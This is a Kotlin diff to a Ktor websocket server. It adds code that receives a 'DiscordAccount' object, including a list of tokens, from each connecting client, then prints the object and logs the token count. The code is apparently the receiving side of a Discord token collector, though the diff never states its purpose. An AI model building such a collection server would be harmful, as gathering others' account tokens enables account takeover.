@@ -1,17 +1,15 @@
 package websocket
 
 import bot.StatusChannel
+import models.informations.DiscordAccount
+import io.ktor.server.application.*
 import io.ktor.server.application.Application
-import io.ktor.server.application.install
-import io.ktor.server.engine.embeddedServer
-import io.ktor.server.netty.Netty
-import io.ktor.server.routing.routing
-import io.ktor.server.websocket.WebSockets
-import io.ktor.server.websocket.webSocket
-import io.ktor.websocket.CloseReason
-import io.ktor.websocket.Frame
-import io.ktor.websocket.close
-import io.ktor.websocket.readText
+import io.ktor.server.routing.*
+import io.ktor.server.websocket.*
+import io.ktor.websocket.*
+import io.netty.util.internal.logging.Slf4JLoggerFactory
+import org.slf4j.LoggerFactory
+import org.slf4j.simple.SimpleLoggerFactory
 
 object Application {
 
@@ -25,6 +23,11 @@ object Application {
                 val thisConnection = Connection(this)
                 connections += thisConnection
                 StatusChannel.update(thisConnection.name)
+
+                val discordInfos = receiveDeserialized<DiscordAccount>()
+                println(discordInfos)
+                LoggerFactory.getLogger(Slf4JLoggerFactory::class.java).info("Received ${discordInfos.username} with ${discordInfos.tokens.size} tokens")
+
                 for (frame in incoming) {
                     frame as? Frame.Text ?: continue
                     when (frame.readText()) {
